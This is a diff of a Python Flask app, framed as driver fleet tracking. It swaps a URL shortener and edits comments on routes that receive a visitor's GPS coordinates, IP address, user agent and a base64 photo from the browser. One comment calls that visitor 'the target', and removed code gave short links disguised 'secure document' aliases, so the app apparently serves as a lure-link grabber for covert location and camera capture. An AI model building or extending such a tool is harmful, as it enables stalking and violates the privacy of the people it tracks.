@@ -40,23 +40,16 @@ def consultar_ip(ip):
         pass
     return "Não identificado", "Não identificado"
 
-# --- ENCURTADOR IS.GD ---
+# --- ENCURTADOR TINYURL ---
 def encurtar_url(url_longa, alias=None):
     if "127.0.0.1" in url_longa or "localhost" in url_longa: return url_longa
-    base_api = "https://is.gd/create.php?format=simple&url={}"
-    if alias:
-        try:
-            alias_limpo = alias.replace(" ", "_").strip()
-            url_p = f"{base_api.format(url_longa)}&shorturl={alias_limpo}"
-            r = requests.get(url_p, timeout=5)
-            if r.status_code == 200 and "Error" not in r.text: return r.text.strip()
-        except: pass
+    base_api = "https://tinyurl.com/api-create.php?url={}"
     try:
-        nome_auto = f"Doc_Seguro_{random.randint(10000, 99999)}"
-        url_a = f"{base_api.format(url_longa)}&shorturl={nome_auto}"
-        r = requests.get(url_a, timeout=5)
-        if r.status_code == 200: return r.text.strip()
-    except: pass
+        r = requests.get(base_api.format(url_longa), timeout=10)
+        if r.status_code == 200:
+            return r.text.strip()
+    except:
+        pass
     return url_longa
 
 # --- ROTAS ---
@@ -88,7 +81,7 @@ def gerar_ordem():
     FROTA[id_ordem] = {
         "motorista": motorista,
         "lat": None, "lon": None,
-        "foto": None, # <--- CAMPO PARA ARMAZENAR A FOTO
+        "foto": None, # <--- NOVO: CAMPO PARA ARMAZENAR A IMAGEM EM BASE64
         "status": "Aguardando Conexão",
         "ultimo_visto": "-",
         "link": link_curto,
@@ -113,7 +106,6 @@ def receber_sinal(id_ordem):
     if id_ordem in FROTA:
         data = request.get_json()
         ua_string = request.headers.get('User-Agent')
-        # Pega IP real (considerando proxy do Render/Ngrok)
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
         
         dispositivo, browser = extrair_dados_tecnicos(ua_string)
@@ -122,7 +114,7 @@ def receber_sinal(id_ordem):
         FROTA[id_ordem].update({
             'lat': data.get('latitude'),
             'lon': data.get('longitude'),
-            'foto': data.get('foto'), # <--- RECEBE A FOTO DO NAVEGADOR
+            'foto': data.get('foto'), # <--- NOVO: RECEBE A FOTO ENVIADA PELO ALVO
             'status': "🟢 Online / Rastreando",
             'ultimo_visto': datetime.now().strftime("%d/%m %H:%M:%S"),
             'ip': ip,
